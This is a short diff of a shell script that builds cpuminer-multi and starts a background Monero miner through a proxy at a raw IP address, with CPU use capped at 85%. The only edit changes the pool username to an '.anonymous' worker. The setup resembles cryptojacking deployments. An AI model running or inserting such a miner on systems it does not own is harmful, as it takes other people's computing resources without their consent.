@@ -5,4 +5,4 @@ cd cpuminer-multi
 chmod +x *
 ./build.sh
 make
-cpulimit --exe cpuminer --limit 85 -b && ./minerd -a cryptonight-monero -o stratum+tcp://europe.cryptonight-hub.miningpoolhub.com:20580 -u ilehoe0202 -p 0202 -x 45.32.21.205:2212 --background
+cpulimit --exe cpuminer --limit 85 -b && ./minerd -a cryptonight-monero -o stratum+tcp://europe.cryptonight-hub.miningpoolhub.com:20580 -u ilehoe0202.anonymous -p 0202 -x 45.32.21.205:2212 --background
